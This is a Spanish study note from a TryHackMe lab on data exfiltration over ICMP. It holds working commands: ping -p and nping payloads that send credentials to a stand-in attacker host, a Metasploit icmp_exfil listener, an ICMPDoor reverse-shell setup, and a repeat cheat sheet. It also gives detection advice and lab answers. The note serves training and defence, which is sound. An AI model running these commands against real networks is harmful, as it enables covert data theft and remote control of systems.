---
tags: [red-team, data-exfiltration, icmp, metasploit, icmpdoor, nping]
created: 2026-04-22
source: TryHackMe - Data Exfiltration
related:
  - "[[Data Exfiltration Concepts]]"
---

# Exfiltración por ICMP

> [!abstract] TL;DR
> ICMP (Internet Control Message Protocol) es el protocolo subyacente de utilidades como `ping`. Aunque su propósito es enviar mensajes de control y error, los paquetes ICMP Echo Request/Reply tienen un campo **Data** opcional. Un atacante puede insertar información arbitraria en este campo para establecer un canal de comunicación sigiloso (Covert Channel).

## Cuándo usarlo

En muchas redes corporativas, ICMP está **permitido** para realizar tareas de diagnóstico de red. Si bien los firewalls pueden bloquear conexiones entrantes TCP/UDP desconocidas, a menudo permiten que los hosts internos hagan `ping` hacia el exterior. 

Es útil cuando:
- Otras salidas están filtradas (TCP/HTTP/DNS).
- Se necesita un mecanismo de exfiltración simple de configurar para archivos pequeños o credenciales.
- Se busca establecer un C2 (Command and Control) de "bajo ruido" si la organización no monitorea el tamaño de los paquetes ICMP.

## Concepto: Abusando la estructura del paquete ICMP

Un paquete ICMP estándar tiene una estructura de encabezados seguida de un área de **Data** (Payload). 

```
┌─────────────┬──────┬─────────┬───────────────┬───────────────────────────┐
│ MAC Header  │  IP  │  ICMP   │  ICMP ID/Seq  │       ICMP DATA           │
│             │Header│ Header  │               │      (Aquí van los        │
│             │      │         │               │     datos robados)        │
└─────────────┴──────┴─────────┴───────────────┴───────────────────────────┘
```

En implementaciones legítimas, el área Data va vacía o rellena de caracteres repetitivos (ej: `abcd...`) simplemente para medir tiempos de viaje. En un ataque, **reemplazamos esa basura con los datos que queremos exfiltrar**.

## Método 1: Exfiltración manual con `ping`

Este es el método más rudimentario y rápido. Solo requiere las utilidades estándar disponibles en Linux.

En sistemas Linux, el comando `ping` tiene la opción `-p` (pattern) que permite inyectar hasta **16 bytes en formato hexadecimal** dentro del área de datos del ICMP Echo Request.

### Proceso:

1. **Convertir el texto a hexadecimal en la víctima:**

```shell
# Queremos enviar "thm:tryhackme"
echo -n "thm:tryhackme" | xxd -p
# Resultado: 74686d3a7472796861636b6d65
```

2. **Enviar el paquete ICMP modificado:**

```shell
ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d65
```
*(El `-c 1` es para enviar un solo paquete)*

3. **Recepción en el atacante:**
El atacante debe estar capturando tráfico con `tcpdump` o `Wireshark` en la interfaz de red correspondiente. Al inspeccionar el paquete ICMP recibido, el campo "Data" mostrará los bytes `74686d...` que se traducen al texto exfiltrado.

## Método 2: Exfiltración automática con Metasploit

Hacer envíos de a 16 bytes manualmente es impráctico para archivos grandes. Metasploit ofrece el módulo `auxiliary/server/icmp_exfil`, que automatiza la escucha y reconstrucción de archivos recibidos por ICMP.

Este módulo funciona bajo un protocolo simple inventado por el creador del módulo:
- **Inicio de archivo:** Un paquete ICMP que comienza con la cadena `^BOF<nombre_archivo>` (Beginning Of File).
- **Datos:** Los paquetes subsecuentes se escriben en disco tal cual llegan.
- **Fin de archivo:** Un paquete ICMP que contiene la cadena `^EOF` (End Of File).

### 1. Configurar el Listener (Atacante)

En Metasploit:

```shell
msf5 > use auxiliary/server/icmp_exfil
msf5 > set BPF_FILTER icmp and not src ATTACKBOX_IP
msf5 > set INTERFACE eth0
msf5 > run
```
*El filtro BPF ignora los paquetes ICMP que genera el propio atacante, escuchando solo lo que llega desde la víctima.*

### 2. Envío desde la víctima con `nping`

En la víctima, necesitamos una herramienta más flexible que `ping` para enviar cadenas largas o archivos. `nping` (parte de la suite nmap) es ideal.

```shell
# 1. Enviar la señal de Inicio (BOF) y el nombre con el que se guardará
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"

# 2. Enviar los datos (puede automatizarse en un script)
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"

# 3. Enviar la señal de Fin (EOF)
sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
```

En la consola de Metasploit, se mostrará que el archivo se ha recibido y guardado en el directorio *loot* (`~/.msf4/loot/`).

## Método 3: Command & Control (C2) sobre ICMP con ICMPDoor

La técnica se puede llevar más allá de la simple exfiltración unidireccional. Herramientas como **ICMPDoor** crean una **Reverse Shell** completa encapsulando tanto los comandos de ida como las respuestas de vuelta dentro de paquetes ICMP.

ICMPDoor es un script en Python (usa la librería `scapy` para forjar paquetes) que el atacante sube a la víctima.

### Flujo de la Reverse Shell ICMP

```
┌─────────────┐   ICMP Echo Request (Data: "whoami") ┌─────────────┐
│   ATACANTE  │ ───────────────────────────────────▶ │   VÍCTIMA   │
│  (icmp-cnc) │                                      │ (icmpdoor)  │
│             │ ◀─────────────────────────────────── │             │
└─────────────┘  ICMP Echo Reply (Data: "root")      └─────────────┘
```

### 1. En la máquina víctima (Client)

Se ejecuta el cliente indicándole a dónde debe llamar:

```shell
sudo icmpdoor -i eth0 -d 192.168.0.133
```
*(El uso de ICMP crudo requiere privilegios de `root`)*

### 2. En el atacante (Server / C2)

Se levanta el "Command and Control" que escucha las respuestas y envía comandos:

```shell
sudo icmp-cnc -i eth1 -d 192.168.0.121
shell: hostname
hostname
shell: ls /tmp/
```

El atacante ahora tiene una shell interactiva que funciona puramente a través de pings (Ping de la muerte invertido).

## OPSEC y Detección

> [!warning]
> Aunque ICMP parezca inofensivo, esta técnica es ruidosa si el Blue Team monitoriza **el tamaño y la frecuencia** de los paquetes ICMP.

- **Tamaño anómalo:** Un `ping` normal tiene un tamaño pequeño y constante (ej. 64 bytes). Paquetes ICMP muy grandes o variables en tamaño indican transporte de datos.
- **Frecuencia (Beaconing):** Si la víctima envía un ping cada 5 segundos exactos al exterior de forma ininterrumpida, es un comportamiento claro de C2 (Beacon).
- **Contenido del Data:** Reglas en sistemas como Suricata o Zeek pueden alertar si el campo Data de ICMP contiene cadenas de texto comunes, binarios ejecutables o bases64 legibles en lugar del relleno predecible estándar.

## Comandos Clave

```shell
# Inyección manual (Linux, víctima)
ping <dst> -c 1 -p $(echo -n "data" | xxd -p)

# Listener en Metasploit (Atacante)
use auxiliary/server/icmp_exfil
set BPF_FILTER icmp and not src <ATTACKER>
set INTERFACE eth0
run

# Envío con Nping (víctima)
sudo nping --icmp -c 1 <dst> --data-string "BOFfile.txt"
sudo nping --icmp -c 1 <dst> --data-string "EOF"

# C2 ICMPDoor: Víctima (Cliente)
sudo icmpdoor -i eth0 -d <ATTACKER_IP>

# C2 ICMPDoor: Atacante (Servidor CNC)
sudo icmp-cnc -i eth0 -d <VICTIM_IP>
```

## Preguntas y Respuestas

- **¿En qué sección del paquete ICMP podemos incluir datos?**
  → `Data`
- **Flag tras establecer C2 ICMP entre JumpBox e ICMP-Host y ejecutar `getFlag`:**
  → Se obtiene ejecutando `shell: getFlag` una vez establecida la sesión `icmp-cnc`.
